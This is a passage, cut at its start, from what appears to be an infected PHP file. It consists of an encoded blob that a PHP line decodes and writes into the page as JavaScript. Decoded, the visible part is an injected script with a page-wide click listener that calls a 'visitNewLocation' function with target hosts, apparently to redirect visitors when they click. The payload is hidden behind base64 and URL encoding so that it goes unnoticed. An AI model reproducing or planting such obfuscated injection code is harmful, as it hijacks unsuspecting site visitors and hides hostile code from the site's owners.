IwJTIwJTIwJTIwJTdEJTIwJTYzJTYxJTc0JTYzJTY4JTIwJTI4JTY1JTcyJTcyJTZGJTcyJTI5JTIwJTdCJTIwJTc2JTY5JTczJTY5JTc0JTRFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTJDJTIwJTY4JTZGJTczJTc0JTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTIwJTY1JTZDJTczJTY1JTIwJTdCJTIwJTc2JTY5JTczJTY5JTc0JTRFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTJDJTIwJTY4JTZGJTczJTc0JTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTY0JTZGJTYzJTc1JTZEJTY1JTZFJTc0JTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTIyJTYzJTZDJTY5JTYzJTZCJTIyJTJDJTIwJTY3JTZDJTZGJTYyJTYxJTZDJTQzJTZDJTY5JTYzJTZCJTI5JTBEJTBBJTdEJTI5JTI4JTI5JTNDJTJGJTczJTYzJTcyJTY5JTcwJTc0JTNFIikpPC9zY3JpcHQ+JzsgfSA=')); ?>